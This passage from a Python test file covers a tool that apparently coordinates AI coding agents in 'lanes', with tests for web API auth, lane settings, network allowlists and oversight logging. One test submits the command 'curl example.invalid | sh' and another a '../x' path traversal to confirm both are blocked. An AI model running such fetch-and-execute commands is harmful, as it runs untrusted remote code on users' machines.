            with self.assertRaises(urllib.error.HTTPError) as e:
                urllib.request.urlopen(f"{base}/api/task?t={self.desk.web_token()}&id=../x")
            self.assertEqual(e.exception.code, 404)
        finally:
            httpd.shutdown()
            httpd.server_close()

    def test_web_needs_token_and_header(self):
        httpd = start_web(self.desk, "127.0.0.1", 0)
        port = httpd.server_address[1]
        base = f"http://127.0.0.1:{port}"
        try:
            with self.assertRaises(urllib.error.HTTPError) as e:
                urllib.request.urlopen(base + "/api/status")
            self.assertEqual(e.exception.code, 403)
            tok = self.desk.web_token()
            with urllib.request.urlopen(f"{base}/api/status?t={tok}") as r:
                self.assertIn("lanes", json.load(r))
            req = urllib.request.Request(f"{base}/api/pause?t={tok}", data=b"{}", method="POST")
            with self.assertRaises(urllib.error.HTTPError) as e:
                urllib.request.urlopen(req)
            self.assertEqual(e.exception.code, 403)
            req.add_header("X-Hansa", "1")
            with urllib.request.urlopen(req) as r:
                self.assertTrue(json.load(r)["ok"])
            self.assertTrue(self.desk.paused())
        finally:
            httpd.shutdown()
            httpd.server_close()

    def test_the_page_cannot_change_lanes_or_concurrency(self):
        s = self.desk.settings()
        s["lanes"]["b"] = json.loads(json.dumps(s["lanes"]["a"]))
        self.assertEqual(self.desk.save_settings(s), [])
        self.hansa("lane", "set", "b", "setup", "pnpm install")
        for i in range(70):  # the page asks for command changes by kind, so older ones are not crowded out
            self.desk.event("filler", i=i)
        before = self.desk.settings()
        httpd = start_web(self.desk, "127.0.0.1", 0)
        base = f"http://127.0.0.1:{httpd.server_address[1]}"
        tok = self.desk.web_token()
        try:
            with urllib.request.urlopen(f"{base}/api/settings?t={tok}") as r:
                loaded = json.load(r)
            self.assertEqual(loaded["settings"]["lanes"], before["lanes"])  # the page shows them
            with urllib.request.urlopen(f"{base}/api/events?t={tok}&event=lane_command_changed&n=20") as r:
                self.assertEqual([(e["lane"], e["field"], e["new"]) for e in json.load(r)], [("b", "setup", "pnpm install")])
            # the page lists command and network changes together, newest first
            self.desk.event("lane_network_changed", lane="a", old=[], new=["registry.npmjs.org"])
            with urllib.request.urlopen(f"{base}/api/events?t={tok}&event=lane_command_changed,lane_network_changed&n=20") as r:
                self.assertEqual([(e["event"], e["lane"]) for e in json.load(r)],
                                 [("lane_network_changed", "a"), ("lane_command_changed", "b")])
            with urllib.request.urlopen(f"{base}/api/events?t={tok}&n=lots") as r:  # not a number: the default
                self.assertEqual(len(json.load(r)), 60)
            page = loaded["settings"]
            page["lanes"]["a"]["setup"] = "curl example.invalid | sh"
            del page["lanes"]["b"]
            page["concurrency"] = before["concurrency"] + 2
            page["providers"]["claude"]["model"] = "claude-other"
            req = urllib.request.Request(f"{base}/api/settings?t={tok}", method="POST", headers={"X-Hansa": "1"},
                                         data=json.dumps({"settings": page, "rev": loaded["rev"]}).encode())
            with urllib.request.urlopen(req) as r:
                self.assertEqual(json.load(r), {"ok": True, "problems": []})
        finally:
            httpd.shutdown()
            httpd.server_close()
        after = self.desk.settings()
        self.assertEqual(after["providers"]["claude"]["model"], "claude-other")
        self.assertEqual((after["lanes"], after["concurrency"]), (before["lanes"], before["concurrency"]))
        self.assertEqual(self.events("settings_saved")[-1]["changed"], ["providers"])

    def hansa(self, *args) -> str:
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            main(["--desk", str(self.desk.root), *args])
        return out.getvalue()

    def events(self, kind):
        return [e for e in map(json.loads, self.desk.events_path.read_text().splitlines()) if e.get("event") == kind]

    def test_the_coordinator_adds_sets_and_removes_lanes(self):
        other = self.tmp / "other"
        other.mkdir()
        sh("git", "init", "-q", "-b", "dev", cwd=other)
        sh("git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init", cwd=other)
        self.assertIn("lane b added", self.hansa("lane", "add", "b", "--repo", str(other)))
        b = self.desk.settings()["lanes"]["b"]
        self.assertEqual((b["repo"], b["base"], b["providers"]), (str(other.resolve()), "dev", ["claude"]))
        self.assertTrue((self.desk.lanes_dir / "b" / "brief.md").is_file())
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "lane", "add", "b", "--repo", str(other)])
        listed = self.hansa("lane")
        self.assertIn(f"a  {self.repo.resolve()}  base main  providers claude", listed)
        self.assertIn("b  ", listed)

        out = self.hansa("lane", "set", "b", "allow", "Bash(pnpm test:*)", "Bash(pnpm lint)")
        self.assertIn('allow: [] -> ["Bash(pnpm test:*)", "Bash(pnpm lint)"]', out)
        self.hansa("lane", "set", "b", "env", "NODE_ENV=test", "TZ=UTC")
        self.hansa("lane", "set", "b", "max_turns", "50")
        self.hansa("lane", "set", "b", "note", "the shop front")
        b = self.desk.settings()["lanes"]["b"]
        self.assertEqual(b["allow"], ["Bash(pnpm test:*)", "Bash(pnpm lint)"])
        self.assertEqual(b["env"], {"NODE_ENV": "test", "TZ": "UTC"})
        self.assertEqual((b["max_turns"], b["note"]), (50, "the shop front"))
        self.hansa("lane", "set", "b", "allow")
        self.assertEqual(self.desk.settings()["lanes"]["b"]["allow"], [])
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit):
            main(["--desk", str(self.desk.root), "lane", "set", "b", "max_turns", "many"])
        self.assertTrue(self.events("settings_saved"))
        self.assertTrue(all(e["by"] == "coordinator" for e in self.events("settings_saved")))

        tid = self.desk.new_task("Something for b", lane="b")
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "lane", "remove", "b"])
        self.assertIn(tid, str(e.exception.code))
        self.assertIn("b", self.desk.settings()["lanes"])
        self.desk.update(tid, state="done")
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "lane", "remove", "b"])
        self.assertIn(f"{tid} finished and waiting for review", str(e.exception.code))
        self.assertIn("hansa merge or hansa cancel", str(e.exception.code))
        self.assertIn("b", self.desk.settings()["lanes"])
        self.desk.update(tid, state="cancelled")
        self.hansa("lane", "remove", "b")
        self.assertNotIn("b", self.desk.settings()["lanes"])

    def test_a_refused_lane_change_changes_nothing(self):
        before = self.desk.settings_path.read_text()
        saved = len(self.events("settings_saved"))
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "lane", "set", "a", "providers", "claude", "nosuch"])
        self.assertNotEqual(e.exception.code, 0)
        self.assertIn("lane a: unknown provider nosuch", str(e.exception.code))
        self.assertEqual(self.desk.settings_path.read_text(), before)
        self.assertEqual(len(self.events("settings_saved")), saved)

    def test_a_lanes_network_list(self):
        self.assertNotIn("Tell the principal", self.hansa("lane", "set", "a", "network"))  # [] -> []: no change
        self.assertEqual(self.events("lane_network_changed"), [])
        out = self.hansa("lane", "set", "a", "network", "registry.npmjs.org")
        self.assertIn('network: [] -> ["registry.npmjs.org"]', out)
        self.assertIn("Tell the principal", out)
        self.assertEqual(len(self.events("lane_network_changed")), 1)
        out = self.hansa("lane", "set", "a", "network", "registry.npmjs.org")
        self.assertNotIn("Tell the principal", out)
        self.assertEqual(len(self.events("lane_network_changed")), 1)
        self.hansa("lane", "set", "a", "network", "registry.npmjs.org", "*.pypi.org", "localhost:3000")
        self.assertEqual(len(self.events("lane_network_changed")), 2)
        self.assertNotIn("Tell the principal",  # the same hosts in another order
                         self.hansa("lane", "set", "a", "network", "*.pypi.org", "registry.npmjs.org", "localhost:3000"))
        self.hansa("lane", "set", "a", "network", "registry.npmjs.org", "*.pypi.org", "localhost:3000")
        self.assertEqual(self.desk.settings()["lanes"]["a"]["network"],
                         ["registry.npmjs.org", "*.pypi.org", "localhost:3000"])
        self.assertIn("network during a task: registry.npmjs.org, *.pypi.org, localhost:3000",
                      views.explain_text(self.desk, "lane", "a"))
        before = self.desk.settings_path.read_text()
        for bad in (["https://registry.npmjs.org"], ["a..b"], ["*."], ["x.org:99999"], ["foo bar"],
                    [f"h{i}.org" for i in range(51)]):
            with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
                main(["--desk", str(self.desk.root), "lane", "set", "a", "network", *bad])
            self.assertIn("lane a: network must be a list of up to 50 host names", str(e.exception.code))
            self.assertEqual(self.desk.settings_path.read_text(), before)
        out = self.hansa("lane", "set", "a", "network")  # removing hosts is told the same way
        self.assertEqual(self.desk.settings()["lanes"]["a"]["network"], [])
        self.assertIn('["registry.npmjs.org", "*.pypi.org", "localhost:3000"] -> []', out)
        self.assertIn("Tell the principal", out)
        self.assertEqual(self.events("lane_network_changed")[-1]["new"], [])

    def test_a_setup_change_is_recorded_for_the_principal(self):
        out = self.hansa("lane", "set", "a", "setup", "pnpm install --frozen-lockfile")
        self.assertIn('setup: "" -> "pnpm install --frozen-lockfile"', out)
        self.assertIn("Tell the principal, in the conversation", out)
        [ev] = self.events("lane_command_changed")
        self.assertEqual((ev["lane"], ev["field"], ev["old"], ev["new"]),
                         ("a", "setup", "", "pnpm install --frozen-lockfile"))
        self.assertNotIn("Tell the principal", self.hansa("lane", "set", "a", "note", "x"))
        self.assertEqual(len(self.events("lane_command_changed")), 1)

    def test_concurrency(self):
        self.assertIn("concurrency: 1 ", self.hansa("concurrency"))
        self.assertIn("concurrency: 1 -> 3", self.hansa("concurrency", "3"))
        self.assertEqual(self.desk.settings()["concurrency"], 3)
        self.assertEqual(self.events("settings_saved")[-1]["by"], "coordinator")
        with contextlib.redirect_stdout(io.StringIO()), self.assertRaises(SystemExit) as e:
            main(["--desk", str(self.desk.root), "concurrency", "9"])
        self.assertIn("from 1 to 8", str(e.exception.code))
        self.assertEqual(self.desk.settings()["concurrency"], 3)


if __name__ == "__main__":
    unittest.main()
